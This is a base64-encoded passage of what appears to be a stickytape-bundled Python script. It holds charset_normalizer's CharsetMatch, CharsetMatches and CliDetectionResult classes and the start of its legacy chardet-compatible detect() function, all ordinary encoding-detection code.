AgIHJldHVybiBtZXNzX3JhdGlvKHN0cihzZWxmKSwgMS4wKVxuXG4gICAgQHByb3BlcnR5XG4gICAgZGVmIGNvaGVyZW5jZV9ub25fbGF0aW4oc2VsZikgLT4gZmxvYXQ6XG4gICAgICAgICIiIlxuICAgICAgICBDb2hlcmVuY2UgcmF0aW8gb24gdGhlIGZpcnN0IG5vbi1sYXRpbiBsYW5ndWFnZSBkZXRlY3RlZCBpZiBBTlkuXG4gICAgICAgIE5vdGljZTogV2lsbCBiZSByZW1vdmVkIGluIDMuMFxuICAgICAgICAiIiJcbiAgICAgICAgd2FybmluZ3Mud2FybihcbiAgICAgICAgICAgICJjb2hlcmVuY2Vfbm9uX2xhdGluIGlzIGRlcHJlY2F0ZWQgYW5kIHdpbGwgYmUgcmVtb3ZlZCBpbiAzLjAiLFxuICAgICAgICAgICAgRGVwcmVjYXRpb25XYXJuaW5nLFxuICAgICAgICApXG4gICAgICAgIHJldHVybiAwLjBcblxuICAgIEBwcm9wZXJ0eVxuICAgIGRlZiB3X2NvdW50ZXIoc2VsZikgLT4gQ291bnRlcjpcbiAgICAgICAgIiIiXG4gICAgICAgIFdvcmQgY291bnRlciBpbnN0YW5jZSBvbiBkZWNvZGVkIHRleHQuXG4gICAgICAgIE5vdGljZTogV2lsbCBiZSByZW1vdmVkIGluIDMuMFxuICAgICAgICAiIiJcbiAgICAgICAgd2FybmluZ3Mud2FybihcbiAgICAgICAgICAgICJ3X2NvdW50ZXIgaXMgZGVwcmVjYXRlZCBhbmQgd2lsbCBiZSByZW1vdmVkIGluIDMuMCIsIERlcHJlY2F0aW9uV2FybmluZ1xuICAgICAgICApXG5cbiAgICAgICAgc3RyaW5nX3ByaW50YWJsZV9vbmx5ID0gc3ViKE5PVF9QUklOVEFCTEVfUEFUVEVSTiwgIiAiLCBzdHIoc2VsZikubG93ZXIoKSlcblxuICAgICAgICByZXR1cm4gQ291bnRlcihzdHJpbmdfcHJpbnRhYmxlX29ubHkuc3BsaXQoKSlcblxuICAgIGRlZiBfX3N0cl9fKHNlbGYpIC0+IHN0cjpcbiAgICAgICAgIyBMYXp5IFN0ciBMb2FkaW5nXG4gICAgICAgIGlmIHNlbGYuX3N0cmluZyBpcyBOb25lOlxuICAgICAgICAgICAgc2VsZi5fc3RyaW5nID0gc3RyKHNlbGYuX3BheWxvYWQsIHNlbGYuX2VuY29kaW5nLCAic3RyaWN0IilcbiAgICAgICAgcmV0dXJuIHNlbGYuX3N0cmluZ1xuXG4gICAgZGVmIF9fcmVwcl9fKHNlbGYpIC0+IHN0cjpcbiAgICAgICAgcmV0dXJuICI8Q2hhcnNldE1hdGNoIFwne31cJyBieXRlcyh7fSk+Ii5mb3JtYXQoc2VsZi5lbmNvZGluZywgc2VsZi5maW5nZXJwcmludClcblxuICAgIGRlZiBhZGRfc3VibWF0Y2goc2VsZiwgb3RoZXI6ICJDaGFyc2V0TWF0Y2giKSAtPiBOb25lOlxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShvdGhlciwgQ2hhcnNldE1hdGNoKSBvciBvdGhlciA9PSBzZWxmOlxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcbiAgICAgICAgICAgICAgICAiVW5hYmxlIHRvIGFkZCBpbnN0YW5jZSA8e30+IGFzIGEgc3VibWF0Y2ggb2YgYSBDaGFyc2V0TWF0Y2giLmZvcm1hdChcbiAgICAgICAgICAgICAgICAgICAgb3RoZXIuX19jbGFzc19fXG4gICAgICAgICAgICAgICAgKVxuICAgICAgICAgICAgKVxuXG4gICAgICAgIG90aGVyLl9zdHJpbmcgPSBOb25lICAjIFVubG9hZCBSQU0gdXNhZ2U7IGRpcnR5IHRyaWNrLlxuICAgICAgICBzZWxmLl9sZWF2ZXMuYXBwZW5kKG90aGVyKVxuXG4gICAgQHByb3BlcnR5XG4gICAgZGVmIGVuY29kaW5nKHNlbGYpIC0+IHN0cjpcbiAgICAgICAgcmV0dXJuIHNlbGYuX2VuY29kaW5nXG5cbiAgICBAcHJvcGVydHlcbiAgICBkZWYgZW5jb2RpbmdfYWxpYXNlcyhzZWxmKSAtPiBMaXN0W3N0cl06XG4gICAgICAgICIiIlxuICAgICAgICBFbmNvZGluZyBuYW1lIGFyZSBrbm93biBieSBtYW55IG5hbWUsIHVzaW5nIHRoaXMgY291bGQgaGVscCB3aGVuIHNlYXJjaGluZyBmb3IgSUJNODU1IHdoZW4gaXRcJ3MgbGlzdGVkIGFzIENQODU1LlxuICAgICAgICAiIiJcbiAgICAgICAgYWxzb19rbm93bl9hcyA9IFtdICAjIHR5cGU6IExpc3Rbc3RyXVxuICAgICAgICBmb3IgdSwgcCBpbiBhbGlhc2VzLml0ZW1zKCk6XG4gICAgICAgICAgICBpZiBzZWxmLmVuY29kaW5nID09IHU6XG4gICAgICAgICAgICAgICAgYWxzb19rbm93bl9hcy5hcHBlbmQocClcbiAgICAgICAgICAgIGVsaWYgc2VsZi5lbmNvZGluZyA9PSBwOlxuICAgICAgICAgICAgICAgIGFsc29fa25vd25fYXMuYXBwZW5kKHUpXG4gICAgICAgIHJldHVybiBhbHNvX2tub3duX2FzXG5cbiAgICBAcHJvcGVydHlcbiAgICBkZWYgYm9tKHNlbGYpIC0+IGJvb2w6XG4gICAgICAgIHJldHVybiBzZWxmLl9oYXNfc2lnX29yX2JvbVxuXG4gICAgQHByb3BlcnR5XG4gICAgZGVmIGJ5dGVfb3JkZXJfbWFyayhzZWxmKSAtPiBib29sOlxuICAgICAgICByZXR1cm4gc2VsZi5faGFzX3NpZ19vcl9ib21cblxuICAgIEBwcm9wZXJ0eVxuICAgIGRlZiBsYW5ndWFnZXMoc2VsZikgLT4gTGlzdFtzdHJdOlxuICAgICAgICAiIiJcbiAgICAgICAgUmV0dXJuIHRoZSBjb21wbGV0ZSBsaXN0IG9mIHBvc3NpYmxlIGxhbmd1YWdlcyBmb3VuZCBpbiBkZWNvZGVkIHNlcXVlbmNlLlxuICAgICAgICBVc3VhbGx5IG5vdCByZWFsbHkgdXNlZnVsLiBSZXR1cm5lZCBsaXN0IG1heSBiZSBlbXB0eSBldmVuIGlmIFwnbGFuZ3VhZ2VcJyBwcm9wZXJ0eSByZXR1cm4gc29tZXRoaW5nICE9IFwnVW5rbm93blwnLlxuICAgICAgICAiIiJcbiAgICAgICAgcmV0dXJuIFtlWzBdIGZvciBlIGluIHNlbGYuX2xhbmd1YWdlc11cblxuICAgIEBwcm9wZXJ0eVxuICAgIGRlZiBsYW5ndWFnZShzZWxmKSAtPiBzdHI6XG4gICAgICAgICIiIlxuICAgICAgICBNb3N0IHByb2JhYmxlIGxhbmd1YWdlIGZvdW5kIGluIGRlY29kZWQgc2VxdWVuY2UuIElmIG5vbmUgd2VyZSBkZXRlY3RlZCBvciBpbmZlcnJlZCwgdGhlIHByb3BlcnR5IHdpbGwgcmV0dXJuXG4gICAgICAgICJVbmtub3duIi5cbiAgICAgICAgIiIiXG4gICAgICAgIGlmIG5vdCBzZWxmLl9sYW5ndWFnZXM6XG4gICAgICAgICAgICAjIFRyeWluZyB0byBpbmZlciB0aGUgbGFuZ3VhZ2UgYmFzZWQgb24gdGhlIGdpdmVuIGVuY29kaW5nXG4gICAgICAgICAgICAjIEl0cyBlaXRoZXIgRW5nbGlzaCBvciB3ZSBzaG91bGQgbm90IHByb25vdW5jZSBvdXJzZWx2ZXMgaW4gY2VydGFpbiBjYXNlcy5cbiAgICAgICAgICAgIGlmICJhc2NpaSIgaW4gc2VsZi5jb3VsZF9iZV9mcm9tX2NoYXJzZXQ6XG4gICAgICAgICAgICAgICAgcmV0dXJuICJFbmdsaXNoIlxuXG4gICAgICAgICAgICAjIGRvaW5nIGl0IHRoZXJlIHRvIGF2b2lkIGNpcmN1bGFyIGltcG9ydFxuICAgICAgICAgICAgZnJvbSBjaGFyc2V0X25vcm1hbGl6ZXIuY2QgaW1wb3J0IGVuY29kaW5nX2xhbmd1YWdlcywgbWJfZW5jb2RpbmdfbGFuZ3VhZ2VzXG5cbiAgICAgICAgICAgIGxhbmd1YWdlcyA9IChcbiAgICAgICAgICAgICAgICBtYl9lbmNvZGluZ19sYW5ndWFnZXMoc2VsZi5lbmNvZGluZylcbiAgICAgICAgICAgICAgICBpZiBpc19tdWx0aV9ieXRlX2VuY29kaW5nKHNlbGYuZW5jb2RpbmcpXG4gICAgICAgICAgICAgICAgZWxzZSBlbmNvZGluZ19sYW5ndWFnZXMoc2VsZi5lbmNvZGluZylcbiAgICAgICAgICAgIClcblxuICAgICAgICAgICAgaWYgbGVuKGxhbmd1YWdlcykgPT0gMCBvciAiTGF0aW4gQmFzZWQiIGluIGxhbmd1YWdlczpcbiAgICAgICAgICAgICAgICByZXR1cm4gIlVua25vd24iXG5cbiAgICAgICAgICAgIHJldHVybiBsYW5ndWFnZXNbMF1cblxuICAgICAgICByZXR1cm4gc2VsZi5fbGFuZ3VhZ2VzWzBdWzBdXG5cbiAgICBAcHJvcGVydHlcbiAgICBkZWYgY2hhb3Moc2VsZikgLT4gZmxvYXQ6XG4gICAgICAgIHJldHVybiBzZWxmLl9tZWFuX21lc3NfcmF0aW9cblxuICAgIEBwcm9wZXJ0eVxuICAgIGRlZiBjb2hlcmVuY2Uoc2VsZikgLT4gZmxvYXQ6XG4gICAgICAgIGlmIG5vdCBzZWxmLl9sYW5ndWFnZXM6XG4gICAgICAgICAgICByZXR1cm4gMC4wXG4gICAgICAgIHJldHVybiBzZWxmLl9sYW5ndWFnZXNbMF1bMV1cblxuICAgIEBwcm9wZXJ0eVxuICAgIGRlZiBwZXJjZW50X2NoYW9zKHNlbGYpIC0+IGZsb2F0OlxuICAgICAgICByZXR1cm4gcm91bmQoc2VsZi5jaGFvcyAqIDEwMCwgbmRpZ2l0cz0zKVxuXG4gICAgQHByb3BlcnR5XG4gICAgZGVmIHBlcmNlbnRfY29oZXJlbmNlKHNlbGYpIC0+IGZsb2F0OlxuICAgICAgICByZXR1cm4gcm91bmQoc2VsZi5jb2hlcmVuY2UgKiAxMDAsIG5kaWdpdHM9MylcblxuICAgIEBwcm9wZXJ0eVxuICAgIGRlZiByYXcoc2VsZikgLT4gYnl0ZXM6XG4gICAgICAgICIiIlxuICAgICAgICBPcmlnaW5hbCB1bnRvdWNoZWQgYnl0ZXMuXG4gICAgICAgICIiIlxuICAgICAgICByZXR1cm4gc2VsZi5fcGF5bG9hZFxuXG4gICAgQHByb3BlcnR5XG4gICAgZGVmIHN1Ym1hdGNoKHNlbGYpIC0+IExpc3RbIkNoYXJzZXRNYXRjaCJdOlxuICAgICAgICByZXR1cm4gc2VsZi5fbGVhdmVzXG5cbiAgICBAcHJvcGVydHlcbiAgICBkZWYgaGFzX3N1Ym1hdGNoKHNlbGYpIC0+IGJvb2w6XG4gICAgICAgIHJldHVybiBsZW4oc2VsZi5fbGVhdmVzKSA+IDBcblxuICAgIEBwcm9wZXJ0eVxuICAgIGRlZiBhbHBoYWJldHMoc2VsZikgLT4gTGlzdFtzdHJdOlxuICAgICAgICBpZiBzZWxmLl91bmljb2RlX3JhbmdlcyBpcyBub3QgTm9uZTpcbiAgICAgICAgICAgIHJldHVybiBzZWxmLl91bmljb2RlX3Jhbmdlc1xuICAgICAgICAjIGxpc3QgZGV0ZWN0ZWQgcmFuZ2VzXG4gICAgICAgIGRldGVjdGVkX3JhbmdlcyA9IFtcbiAgICAgICAgICAgIHVuaWNvZGVfcmFuZ2UoY2hhcikgZm9yIGNoYXIgaW4gc3RyKHNlbGYpXG4gICAgICAgIF0gICMgdHlwZTogTGlzdFtPcHRpb25hbFtzdHJdXVxuICAgICAgICAjIGZpbHRlciBhbmQgc29ydFxuICAgICAgICBzZWxmLl91bmljb2RlX3JhbmdlcyA9IHNvcnRlZChsaXN0KHtyIGZvciByIGluIGRldGVjdGVkX3JhbmdlcyBpZiByfSkpXG4gICAgICAgIHJldHVybiBzZWxmLl91bmljb2RlX3Jhbmdlc1xuXG4gICAgQHByb3BlcnR5XG4gICAgZGVmIGNvdWxkX2JlX2Zyb21fY2hhcnNldChzZWxmKSAtPiBMaXN0W3N0cl06XG4gICAgICAgICIiIlxuICAgICAgICBUaGUgY29tcGxldGUgbGlzdCBvZiBlbmNvZGluZyB0aGF0IG91dHB1dCB0aGUgZXhhY3QgU0FNRSBzdHIgcmVzdWx0IGFuZCB0aGVyZWZvcmUgY291bGQgYmUgdGhlIG9yaWdpbmF0aW5nXG4gICAgICAgIGVuY29kaW5nLlxuICAgICAgICBUaGlzIGxpc3QgZG9lcyBpbmNsdWRlIHRoZSBlbmNvZGluZyBhdmFpbGFibGUgaW4gcHJvcGVydHkgXCdlbmNvZGluZ1wnLlxuICAgICAgICAiIiJcbiAgICAgICAgcmV0dXJuIFtzZWxmLl9lbmNvZGluZ10gKyBbbS5lbmNvZGluZyBmb3IgbSBpbiBzZWxmLl9sZWF2ZXNdXG5cbiAgICBkZWYgZmlyc3Qoc2VsZikgLT4gIkNoYXJzZXRNYXRjaCI6XG4gICAgICAgICIiIlxuICAgICAgICBLZXB0IGZvciBCQyByZWFzb25zLiBXaWxsIGJlIHJlbW92ZWQgaW4gMy4wLlxuICAgICAgICAiIiJcbiAgICAgICAgcmV0dXJuIHNlbGZcblxuICAgIGRlZiBiZXN0KHNlbGYpIC0+ICJDaGFyc2V0TWF0Y2giOlxuICAgICAgICAiIiJcbiAgICAgICAgS2VwdCBmb3IgQkMgcmVhc29ucy4gV2lsbCBiZSByZW1vdmVkIGluIDMuMC5cbiAgICAgICAgIiIiXG4gICAgICAgIHJldHVybiBzZWxmXG5cbiAgICBkZWYgb3V0cHV0KHNlbGYsIGVuY29kaW5nOiBzdHIgPSAidXRmXzgiKSAtPiBieXRlczpcbiAgICAgICAgIiIiXG4gICAgICAgIE1ldGhvZCB0byBnZXQgcmUtZW5jb2RlZCBieXRlcyBwYXlsb2FkIHVzaW5nIGdpdmVuIHRhcmdldCBlbmNvZGluZy4gRGVmYXVsdCB0byBVVEYtOC5cbiAgICAgICAgQW55IGVycm9ycyB3aWxsIGJlIHNpbXBseSBpZ25vcmVkIGJ5IHRoZSBlbmNvZGVyIE5PVCByZXBsYWNlZC5cbiAgICAgICAgIiIiXG4gICAgICAgIGlmIHNlbGYuX291dHB1dF9lbmNvZGluZyBpcyBOb25lIG9yIHNlbGYuX291dHB1dF9lbmNvZGluZyAhPSBlbmNvZGluZzpcbiAgICAgICAgICAgIHNlbGYuX291dHB1dF9lbmNvZGluZyA9IGVuY29kaW5nXG4gICAgICAgICAgICBzZWxmLl9vdXRwdXRfcGF5bG9hZCA9IHN0cihzZWxmKS5lbmNvZGUoZW5jb2RpbmcsICJyZXBsYWNlIilcblxuICAgICAgICByZXR1cm4gc2VsZi5fb3V0cHV0X3BheWxvYWQgICMgdHlwZTogaWdub3JlXG5cbiAgICBAcHJvcGVydHlcbiAgICBkZWYgZmluZ2VycHJpbnQoc2VsZikgLT4gc3RyOlxuICAgICAgICAiIiJcbiAgICAgICAgUmV0cmlldmUgdGhlIHVuaXF1ZSBTSEEyNTYgY29tcHV0ZWQgdXNpbmcgdGhlIHRyYW5zZm9ybWVkIChyZS1lbmNvZGVkKSBwYXlsb2FkLiBOb3QgdGhlIG9yaWdpbmFsIG9uZS5cbiAgICAgICAgIiIiXG4gICAgICAgIHJldHVybiBzaGEyNTYoc2VsZi5vdXRwdXQoKSkuaGV4ZGlnZXN0KClcblxuXG5jbGFzcyBDaGFyc2V0TWF0Y2hlczpcbiAgICAiIiJcbiAgICBDb250YWluZXIgd2l0aCBldmVyeSBDaGFyc2V0TWF0Y2ggaXRlbXMgb3JkZXJlZCBieSBkZWZhdWx0IGZyb20gbW9zdCBwcm9iYWJsZSB0byB0aGUgbGVzcyBvbmUuXG4gICAgQWN0IGxpa2UgYSBsaXN0KGl0ZXJhYmxlKSBidXQgZG9lcyBub3QgaW1wbGVtZW50cyBhbGwgcmVsYXRlZCBtZXRob2RzLlxuICAgICIiIlxuXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIHJlc3VsdHM6IExpc3RbQ2hhcnNldE1hdGNoXSA9IE5vbmUpOlxuICAgICAgICBzZWxmLl9yZXN1bHRzID0gc29ydGVkKHJlc3VsdHMpIGlmIHJlc3VsdHMgZWxzZSBbXSAgIyB0eXBlOiBMaXN0W0NoYXJzZXRNYXRjaF1cblxuICAgIGRlZiBfX2l0ZXJfXyhzZWxmKSAtPiBJdGVyYXRvcltDaGFyc2V0TWF0Y2hdOlxuICAgICAgICB5aWVsZCBmcm9tIHNlbGYuX3Jlc3VsdHNcblxuICAgIGRlZiBfX2dldGl0ZW1fXyhzZWxmLCBpdGVtOiBVbmlvbltpbnQsIHN0cl0pIC0+IENoYXJzZXRNYXRjaDpcbiAgICAgICAgIiIiXG4gICAgICAgIFJldHJpZXZlIGEgc2luZ2xlIGl0ZW0gZWl0aGVyIGJ5IGl0cyBwb3NpdGlvbiBvciBlbmNvZGluZyBuYW1lIChhbGlhcyBtYXkgYmUgdXNlZCBoZXJlKS5cbiAgICAgICAgUmFpc2UgS2V5RXJyb3IgdXBvbiBpbnZhbGlkIGluZGV4IG9yIGVuY29kaW5nIG5vdCBwcmVzZW50IGluIHJlc3VsdHMuXG4gICAgICAgICIiIlxuICAgICAgICBpZiBpc2luc3RhbmNlKGl0ZW0sIGludCk6XG4gICAgICAgICAgICByZXR1cm4gc2VsZi5fcmVzdWx0c1tpdGVtXVxuICAgICAgICBpZiBpc2luc3RhbmNlKGl0ZW0sIHN0cik6XG4gICAgICAgICAgICBpdGVtID0gaWFuYV9uYW1lKGl0ZW0sIEZhbHNlKVxuICAgICAgICAgICAgZm9yIHJlc3VsdCBpbiBzZWxmLl9yZXN1bHRzOlxuICAgICAgICAgICAgICAgIGlmIGl0ZW0gaW4gcmVzdWx0LmNvdWxkX2JlX2Zyb21fY2hhcnNldDpcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHJlc3VsdFxuICAgICAgICByYWlzZSBLZXlFcnJvclxuXG4gICAgZGVmIF9fbGVuX18oc2VsZikgLT4gaW50OlxuICAgICAgICByZXR1cm4gbGVuKHNlbGYuX3Jlc3VsdHMpXG5cbiAgICBkZWYgX19ib29sX18oc2VsZikgLT4gYm9vbDpcbiAgICAgICAgcmV0dXJuIGxlbihzZWxmLl9yZXN1bHRzKSA+IDBcblxuICAgIGRlZiBhcHBlbmQoc2VsZiwgaXRlbTogQ2hhcnNldE1hdGNoKSAtPiBOb25lOlxuICAgICAgICAiIiJcbiAgICAgICAgSW5zZXJ0IGEgc2luZ2xlIG1hdGNoLiBXaWxsIGJlIGluc2VydGVkIGFjY29yZGluZ2x5IHRvIHByZXNlcnZlIHNvcnQuXG4gICAgICAgIENhbiBiZSBpbnNlcnRlZCBhcyBhIHN1Ym1hdGNoLlxuICAgICAgICAiIiJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UoaXRlbSwgQ2hhcnNldE1hdGNoKTpcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXG4gICAgICAgICAgICAgICAgIkNhbm5vdCBhcHBlbmQgaW5zdGFuY2UgXCd7fVwnIHRvIENoYXJzZXRNYXRjaGVzIi5mb3JtYXQoXG4gICAgICAgICAgICAgICAgICAgIHN0cihpdGVtLl9fY2xhc3NfXylcbiAgICAgICAgICAgICAgICApXG4gICAgICAgICAgICApXG4gICAgICAgICMgV2Ugc2hvdWxkIGRpc2FibGUgdGhlIHN1Ym1hdGNoIGZhY3RvcmluZyB3aGVuIHRoZSBpbnB1dCBmaWxlIGlzIHRvbyBoZWF2eSAoY29uc2VydmUgUkFNIHVzYWdlKVxuICAgICAgICBpZiBsZW4oaXRlbS5yYXcpIDw9IFRPT19CSUdfU0VRVUVOQ0U6XG4gICAgICAgICAgICBmb3IgbWF0Y2ggaW4gc2VsZi5fcmVzdWx0czpcbiAgICAgICAgICAgICAgICBpZiBtYXRjaC5maW5nZXJwcmludCA9PSBpdGVtLmZpbmdlcnByaW50IGFuZCBtYXRjaC5jaGFvcyA9PSBpdGVtLmNoYW9zOlxuICAgICAgICAgICAgICAgICAgICBtYXRjaC5hZGRfc3VibWF0Y2goaXRlbSlcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuXG4gICAgICAgIHNlbGYuX3Jlc3VsdHMuYXBwZW5kKGl0ZW0pXG4gICAgICAgIHNlbGYuX3Jlc3VsdHMgPSBzb3J0ZWQoc2VsZi5fcmVzdWx0cylcblxuICAgIGRlZiBiZXN0KHNlbGYpIC0+IE9wdGlvbmFsWyJDaGFyc2V0TWF0Y2giXTpcbiAgICAgICAgIiIiXG4gICAgICAgIFNpbXBseSByZXR1cm4gdGhlIGZpcnN0IG1hdGNoLiBTdHJpY3QgZXF1aXZhbGVudCB0byBtYXRjaGVzWzBdLlxuICAgICAgICAiIiJcbiAgICAgICAgaWYgbm90IHNlbGYuX3Jlc3VsdHM6XG4gICAgICAgICAgICByZXR1cm4gTm9uZVxuICAgICAgICByZXR1cm4gc2VsZi5fcmVzdWx0c1swXVxuXG4gICAgZGVmIGZpcnN0KHNlbGYpIC0+IE9wdGlvbmFsWyJDaGFyc2V0TWF0Y2giXTpcbiAgICAgICAgIiIiXG4gICAgICAgIFJlZHVuZGFudCBtZXRob2QsIGNhbGwgdGhlIG1ldGhvZCBiZXN0KCkuIEtlcHQgZm9yIEJDIHJlYXNvbnMuXG4gICAgICAgICIiIlxuICAgICAgICByZXR1cm4gc2VsZi5iZXN0KClcblxuXG5Db2hlcmVuY2VNYXRjaCA9IFR1cGxlW3N0ciwgZmxvYXRdXG5Db2hlcmVuY2VNYXRjaGVzID0gTGlzdFtDb2hlcmVuY2VNYXRjaF1cblxuXG5jbGFzcyBDbGlEZXRlY3Rpb25SZXN1bHQ6XG4gICAgZGVmIF9faW5pdF9fKFxuICAgICAgICBzZWxmLFxuICAgICAgICBwYXRoOiBzdHIsXG4gICAgICAgIGVuY29kaW5nOiBPcHRpb25hbFtzdHJdLFxuICAgICAgICBlbmNvZGluZ19hbGlhc2VzOiBMaXN0W3N0cl0sXG4gICAgICAgIGFsdGVybmF0aXZlX2VuY29kaW5nczogTGlzdFtzdHJdLFxuICAgICAgICBsYW5ndWFnZTogc3RyLFxuICAgICAgICBhbHBoYWJldHM6IExpc3Rbc3RyXSxcbiAgICAgICAgaGFzX3NpZ19vcl9ib206IGJvb2wsXG4gICAgICAgIGNoYW9zOiBmbG9hdCxcbiAgICAgICAgY29oZXJlbmNlOiBmbG9hdCxcbiAgICAgICAgdW5pY29kZV9wYXRoOiBPcHRpb25hbFtzdHJdLFxuICAgICAgICBpc19wcmVmZXJyZWQ6IGJvb2wsXG4gICAgKTpcbiAgICAgICAgc2VsZi5wYXRoID0gcGF0aCAgIyB0eXBlOiBzdHJcbiAgICAgICAgc2VsZi51bmljb2RlX3BhdGggPSB1bmljb2RlX3BhdGggICMgdHlwZTogT3B0aW9uYWxbc3RyXVxuICAgICAgICBzZWxmLmVuY29kaW5nID0gZW5jb2RpbmcgICMgdHlwZTogT3B0aW9uYWxbc3RyXVxuICAgICAgICBzZWxmLmVuY29kaW5nX2FsaWFzZXMgPSBlbmNvZGluZ19hbGlhc2VzICAjIHR5cGU6IExpc3Rbc3RyXVxuICAgICAgICBzZWxmLmFsdGVybmF0aXZlX2VuY29kaW5ncyA9IGFsdGVybmF0aXZlX2VuY29kaW5ncyAgIyB0eXBlOiBMaXN0W3N0cl1cbiAgICAgICAgc2VsZi5sYW5ndWFnZSA9IGxhbmd1YWdlICAjIHR5cGU6IHN0clxuICAgICAgICBzZWxmLmFscGhhYmV0cyA9IGFscGhhYmV0cyAgIyB0eXBlOiBMaXN0W3N0cl1cbiAgICAgICAgc2VsZi5oYXNfc2lnX29yX2JvbSA9IGhhc19zaWdfb3JfYm9tICAjIHR5cGU6IGJvb2xcbiAgICAgICAgc2VsZi5jaGFvcyA9IGNoYW9zICAjIHR5cGU6IGZsb2F0XG4gICAgICAgIHNlbGYuY29oZXJlbmNlID0gY29oZXJlbmNlICAjIHR5cGU6IGZsb2F0XG4gICAgICAgIHNlbGYuaXNfcHJlZmVycmVkID0gaXNfcHJlZmVycmVkICAjIHR5cGU6IGJvb2xcblxuICAgIEBwcm9wZXJ0eVxuICAgIGRlZiBfX2RpY3RfXyhzZWxmKSAtPiBEaWN0W3N0ciwgQW55XTogICMgdHlwZTogaWdub3JlXG4gICAgICAgIHJldHVybiB7XG4gICAgICAgICAgICAicGF0aCI6IHNlbGYucGF0aCxcbiAgICAgICAgICAgICJlbmNvZGluZyI6IHNlbGYuZW5jb2RpbmcsXG4gICAgICAgICAgICAiZW5jb2RpbmdfYWxpYXNlcyI6IHNlbGYuZW5jb2RpbmdfYWxpYXNlcyxcbiAgICAgICAgICAgICJhbHRlcm5hdGl2ZV9lbmNvZGluZ3MiOiBzZWxmLmFsdGVybmF0aXZlX2VuY29kaW5ncyxcbiAgICAgICAgICAgICJsYW5ndWFnZSI6IHNlbGYubGFuZ3VhZ2UsXG4gICAgICAgICAgICAiYWxwaGFiZXRzIjogc2VsZi5hbHBoYWJldHMsXG4gICAgICAgICAgICAiaGFzX3NpZ19vcl9ib20iOiBzZWxmLmhhc19zaWdfb3JfYm9tLFxuICAgICAgICAgICAgImNoYW9zIjogc2VsZi5jaGFvcyxcbiAgICAgICAgICAgICJjb2hlcmVuY2UiOiBzZWxmLmNvaGVyZW5jZSxcbiAgICAgICAgICAgICJ1bmljb2RlX3BhdGgiOiBzZWxmLnVuaWNvZGVfcGF0aCxcbiAgICAgICAgICAgICJpc19wcmVmZXJyZWQiOiBzZWxmLmlzX3ByZWZlcnJlZCxcbiAgICAgICAgfVxuXG4gICAgZGVmIHRvX2pzb24oc2VsZikgLT4gc3RyOlxuICAgICAgICByZXR1cm4gZHVtcHMoc2VsZi5fX2RpY3RfXywgZW5zdXJlX2FzY2lpPVRydWUsIGluZGVudD00KVxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2NoYXJzZXRfbm9ybWFsaXplci9sZWdhY3kucHknLCBiJ2ltcG9ydCB3YXJuaW5nc1xuZnJvbSB0eXBpbmcgaW1wb3J0IERpY3QsIE9wdGlvbmFsLCBVbmlvblxuXG5mcm9tIC5hcGkgaW1wb3J0IGZyb21fYnl0ZXMsIGZyb21fZnAsIGZyb21fcGF0aCwgbm9ybWFsaXplXG5mcm9tIC5jb25zdGFudCBpbXBvcnQgQ0hBUkRFVF9DT1JSRVNQT05ERU5DRVxuZnJvbSAubW9kZWxzIGltcG9ydCBDaGFyc2V0TWF0Y2gsIENoYXJzZXRNYXRjaGVzXG5cblxuZGVmIGRldGVjdChieXRlX3N0cjogYnl0ZXMpIC0+IERpY3Rbc3RyLCBPcHRpb25hbFtVbmlvbltzdHIsIGZsb2F0XV1dOlxuICAgICIiIlxuICAgIGNoYXJkZXQgbGVnYWN5IG1ldGhvZFxuICAgIERldGVjdCB0aGUgZW5jb2Rpbmcgb2YgdGhlIGdpdmVuIGJ5dGUgc3RyaW5nLiBJdCBzaG91bGQgYmUgbW9zdGx5IGJhY2t3YXJkLWNvbXBhdGlibGUuXG4gICAgRW5jb2RpbmcgbmFtZSB3aWxsIG1hdGNoIENoYXJkZXQgb3duIHdyaXRpbmcgd2hlbmV2ZXIgcG9zc2libGUuIChOb3Qgb24gZW5jb2RpbmcgbmFtZSB1bnN1cHBvcnRlZCBieSBpdClcbiAgICBUaGlzIGZ1bmN0aW9uIGlzIGRlcHJlY2F0ZWQgYW5kIHNob3VsZCBiZSB1c2VkIHRvIG1pZ3JhdGUgeW91ciBwcm9qZWN0IGVhc2lseSwgY29uc3VsdCB0aGUgZG9jdW1lbnRhdGlvbiBmb3JcbiAgICBmdXJ0aGVyIGluZm9ybWF0aW9uLiBOb3QgcGxhbm5lZCBmb3IgcmVtb3ZhbC5cblxuICAgIDpwYXJhbSBieXRlX3N0cjogICAgIFRoZSBieXRlIHNlcXVlbmNlIHRvIGV4YW1pbmUuXG4gICAgIiIiXG4gICAgaWYgbm90IGlzaW5zdGFuY2UoYnl0ZV9zdHIsIChieXRlYXJyYXksIGJ5dGVzKSk6XG4gICAgICAgIHJhaXNlIFR5cGVFcnJvciggICMgcHJhZ21hOiBub2NvdmVyXG4gICAgICAgICAgICAiRXhwZWN0ZWQgb2JqZWN0IG9mIHR5cGUgYnl0ZXMgb3IgYnl0ZWFycmF5LCBnb3Q6ICJcbiAgICAgICAgICAgICJ7MH0iLmZvcm1hdCh0eXBlKGJ5dGVfc3RyKSlcbiAgICAgICAgKVxuXG4gICAgaWYgaXNpbnN0YW5jZShieXRlX3N0ciwgYnl0ZWFycmF5KTpcbiAgICAgICAgYnl0ZV9zdHIgPSBieXRlcyhieXRlX3N0cilcblxuICAgIHIgPSBmcm9tX2J5dGVzKGJ5dGVfc3RyKS5iZXN0KClcblxuICAgIGVuY29kaW5nID0gci5lbmNvZGluZyBpZiByIGlzIG5vdCBOb25lIGVsc2UgTm9uZVxuICAgIGxhbmd1YWdlID0gci5sYW5ndWFnZSBpZiByIGlzIG5vdCBOb25lIGFuZCByLmxhbmd1YWdlICE9ICJVbmtub3duIiBlbHNlICIiXG4gICAgY29uZmlkZW5jZSA9IDEuMCAtIHIuY2hhb3MgaWYgciBpcyBub3QgTm9uZSBlbHNlIE5vbmVcblxuICAgICMgTm90ZTogQ2hhcnNldE5vcm1hbGl6ZXIgZG9lcyBub3QgcmV0dXJuIFwnVVRGLTgtU0lHXCcgYXMgdGhlIHNpZyBnZXQgc3RyaXBwZWQgaW4gdGhlIGRldGVjdGlvbi9ub3JtYWxpemF0aW9uIHByb2Nlc3NcbiAgICAjIGJ1dCBjaGFyZGV0IGRvZXMgcmV